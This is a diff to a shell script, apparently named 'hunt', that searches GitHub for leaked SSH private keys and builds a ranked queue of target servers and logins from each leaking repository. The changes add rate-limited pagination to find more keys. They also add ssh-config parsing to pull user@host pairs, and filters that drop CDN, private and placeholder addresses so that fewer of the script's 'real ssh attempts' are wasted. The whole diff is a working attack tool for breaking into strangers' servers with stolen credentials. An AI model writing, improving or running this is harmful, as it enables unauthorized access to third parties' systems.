@@ -28,7 +28,7 @@ TOKEN="${env_token:-${GITHUB_TOKEN:-}}"
 CONFIG_URL="${env_config:-${CONFIG_URL:-}}"
 HOSTS_PER_REPO="${HOSTS_PER_REPO:-5}"
 TARGET_USERS="${TARGET_USERS:-root}"
-MAX_REPOS="${HUNT_MAX_REPOS:-10}"
+MAX_REPOS="${HUNT_MAX_REPOS:-50}"
 # A run must fit inside the unit's 30-minute TimeoutStartSec. seen.txt records
 # every attempt, so hitting this cap leaves the rest queued for the next run
 # instead of getting SIGTERMed halfway.
@@ -45,23 +45,68 @@ api() {
     fi
 }
 
+# One code-search request -> the /blob/ file urls of the hits. Three html_urls
+# come back per hit (owner, repo, file) and only the file one has /blob/.
+search() {
+    # Code search allows 10 calls/minute, so a 403 is not an error - it is "you
+    # caught up". Pace the calls and retry, instead of silently losing a whole
+    # query's worth of candidates (which is what made the pool look tiny).
+    tries=0
+    while [ "$tries" -lt 3 ]; do
+        tries=$((tries + 1))
+        body=$(api "https://api.github.com/search/code?q=$1&per_page=100${2:-}" 2>/dev/null) || body=""
+        if [ -n "$body" ]; then
+            printf '%s' "$body" | grep -oE '"html_url": *"[^"]+"' \
+              | grep '/blob/' \
+              | sed -e 's/.*"https:/https:/' -e 's/"$//' >> "$WORK/urls.txt" || true
+            sleep 2
+            return 0
+        fi
+        sleep 8
+    done
+    echo "hunt: search '$1' gave nothing (rate limit?)" >&2
+}
+
 # Hosts = public addresses mentioned in the repo that leaked the key. Two passes:
 # config/deploy/doc files first (that is where real addresses actually live),
 # then the whole tree to top up the remainder. Order = how often it shows up.
 # The strict octet pattern rejects version strings such as 00.00.01.01.
 IP_RE='\b(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}\b'
-# RFC1918 + CGNAT + link-local + TEST-NET + multicast/reserved + public DNS
-IP_DROP='^(0\.|10\.|100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.0\.2\.|192\.168\.|198\.51\.100\.|203\.0\.113\.|22[4-9]\.|2[3-5][0-9]\.)'
-IP_NOISE='^(1\.0\.0\.1|1\.1\.1\.1|1\.2\.3\.4|2\.2\.2\.2|3\.3\.3\.3|4\.2\.1\.1|4\.2\.2\.[1-6]|4\.4\.4\.4|5\.6\.7\.8|8\.8\.4\.4|8\.8\.8\.8|9\.9\.9\.9|114\.114\.114\.114|123\.123\.123\.123|208\.67\.(220|222)\.22[02]|223\.5\.5\.5)$'
+# Addresses that can never be our host - a row on one is a wasted ssh attempt.
+# Three kinds of junk, all seen in the live queue: private/reserved/CGNAT, CDN
+# and front ends (github, google, fastly, cloudflare, microsoft - they serve
+# pages, they never run our key), and the numbers READMEs love: placeholders,
+# kernel versions, SNMP OIDs, soname/libtool strings, public DNS.
+IP_BAD='^(0\.|10\.|100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.0\.2\.|192\.168\.|198\.51\.100\.|203\.0\.113\.|22[4-9]\.|2[3-5][0-9]\.|192\.30\.|140\.82\.|185\.199\.|74\.12[5-9]\.|74\.6\.|64\.233\.|66\.249\.|72\.14\.|216\.58\.|172\.217\.|142\.250\.|209\.85\.|151\.101\.|199\.16\.|13\.107\.|40\.126\.|104\.(1[6-9]|2[0-9]|3[01])\.|1\.0\.0\.[01]|1\.1\.1\.1|1\.2\.3\.4|2\.2\.2\.2|3\.3\.3\.3|4\.4\.4\.4|5\.6\.7\.8|8\.8\.4\.4|8\.8\.8\.8|9\.9\.9\.9|114\.114\.114\.114|123\.123\.123\.123|208\.67\.(220|222)\.22[02]|223\.5\.5\.5|1\.3\.6\.1|1\.4\.3\.1|1\.6\.[01]\.[0-9]|1\.7\.2\.4|1\.9\.[02]\.[0-9][0-9]?|2\.5\.4\.42|2\.6\.24\.7|2\.6\.33\.[79]|3\.4\.0\.30|3\.6\.11\.[25]|3\.8\.2\.7|3\.14\.15\.92|4\.2\.1\.10|7\.4\.[27]\.[14]|8\.2\.1\.2|8\.5\.3\.2|12\.2\.6\.4|12\.34\.56\.78|14\.0\.1\.0)$'
 # A repo that literally writes "user@1.2.3.4" (deploy script, ssh config, README)
 # names BOTH the host and the login. That beats guessing users against an
 # arbitrary IP, so those pairs are emitted first and logged to pairs.txt.
 USER_AT_RE='[A-Za-z_][A-Za-z0-9_-]*@([0-9]{1,3}\.){3}[0-9]{1,3}'
 # awk sees these as ERE, where the backslashes are just noise (and warn)
-IP_DROP_AWK=$(printf '%s' "$IP_DROP" | tr -d '\\')
-IP_NOISE_AWK=$(printf '%s' "$IP_NOISE" | tr -d '\\')
+IP_BAD_AWK=$(printf '%s' "$IP_BAD" | tr -d '\\')
 rank_ips() {
-    grep -vE "$IP_DROP" | grep -vE "$IP_NOISE" | sort | uniq -c | sort -rn | awk '{print $2}'
+    grep -vE "$IP_BAD" | sort | uniq -c | sort -rn | awk '{print $2}'
+}
+
+# ssh-config stanzas: HostName + User in one block is the same precise pair, and
+# it lives in exactly the repos that deploy things next to their key. Plain awk
+# (no IGNORECASE), lowercased keyword compare, works whichever order they appear.
+sshcfg_pairs() {
+    grep -rlE '^[[:space:]]*HostName[[:space:]]' "$1" 2>/dev/null | head -n 40 \
+      | while read -r f; do
+            awk '
+                function emit() {
+                    if (hn == "") return
+                    if (hn !~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/) { hn = ""; return }
+                    printf "%s@%s\n", (us == "" ? "root" : us), hn
+                    hn = ""
+                }
+                { k = tolower($1) }
+                k == "host"     { emit(); us = "" }
+                k == "user"     { us = $2; emit() }
+                k == "hostname" { hn = $2; emit() }
+            ' "$f" 2>/dev/null
+        done | sort -u
 }
 
 repo_hosts() {
@@ -75,11 +120,15 @@ repo_hosts() {
              --include='hosts' --include='Dockerfile*' --include='*compose*' \
              "$d" 2>/dev/null | rank_ips > "$d/t1" || true
         grep -rshoE "$IP_RE" "$d" 2>/dev/null | rank_ips > "$d/t2" || true
-        # precise pass: explicit user@host pairs, best signal in the repo
-        grep -rshoE "$USER_AT_RE" "$d" 2>/dev/null | sort -u \
-            | awk -F@ -v drop="$IP_DROP_AWK" -v noise="$IP_NOISE_AWK" \
-                  '{ if ($NF ~ drop || $NF ~ noise) next; print }' \
-            | head -n "$HOSTS_PER_REPO" > "$WORK/last.userip" || true
+        # precise pass: how a server and its login are actually written down -
+        # "user@host" anywhere in the tree, plus ssh-config stanzas. These beat
+        # guessing four usernames against an arbitrary IP, so they go first.
+        {
+            grep -rshoE "$USER_AT_RE" "$d" 2>/dev/null
+            sshcfg_pairs "$d"
+        } | sort -u \
+          | awk -F@ -v junk="$IP_BAD_AWK" '$NF !~ junk { print }' \
+          | head -n "$((HOSTS_PER_REPO * 4))" > "$WORK/last.userip" || true
         cat "$d/t1"
         if [ -s "$d/t1" ]; then
             grep -vxF -f "$d/t1" "$d/t2" 2>/dev/null || true
@@ -97,6 +146,16 @@ harvest() {
         return 0
     fi
     : > "$WORK/urls.txt"; : > "$WORK/repos.txt"; : > "$WORK/pairs.txt"
+    # Rows collected before the junk filters existed can be impossible hosts
+    # (placeholders, CDN fronts, version strings). Every row costs a real ssh
+    # attempt, so drop them - and keep the precise pair rows first.
+    if [ -s "$TARGETS" ]; then
+        before=$(wc -l < "$TARGETS")
+        awk -F'\t' -v junk="$IP_BAD_AWK" '$3 != "" && $3 !~ junk' "$TARGETS" > "$TARGETS.p" \
+            && mv -f "$TARGETS.p" "$TARGETS" || rm -f "$TARGETS.p"
+        after=$(wc -l < "$TARGETS")
+        [ "$before" = "$after" ] || echo "hunt: pruned $((before - after)) impossible rows"
+    fi
     # prune dead keys harvested before the -SK / unparseable filters existed
     for k in "$WORK"/keys/*; do
         [ -f "$k" ] || continue
@@ -119,10 +178,15 @@ harvest() {
     for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY' \
              'filename:id_key' 'filename:id_rsa+ansible' 'filename:id_rsa+terraform' \
              'filename:.pem+inventory'; do
-        api "https://api.github.com/search/code?q=$q&per_page=100" 2>/dev/null \
-          | grep -oE '"html_url": *"[^"]+"' \
-          | grep '/blob/' \
-          | sed -e 's/.*"https:/https:/' -e 's/"$//' >> "$WORK/urls.txt" || true
+        search "$q"
+    done
+    # Second page of the most valuable queries: per_page is what bounds the whole
+    # run, and paging 3 of them roughly doubles the pool for 3 more requests -
+    # inside the 10 code-search calls/minute budget. (Only ~10% of urls are
+    # distinct repos, so the pool is the real constraint, not HUNT_MAX_REPOS.)
+    for q in 'filename:id_rsa+ansible' 'filename:id_rsa+terraform' \
+             'filename:.pem+PRIVATE+KEY'; do
+        search "$q" '&page=2'
     done
     sort -u "$WORK/urls.txt" > "$WORK/urls.uniq"
     # Shuffle so successive runs do not keep re-inspecting the same top repos,
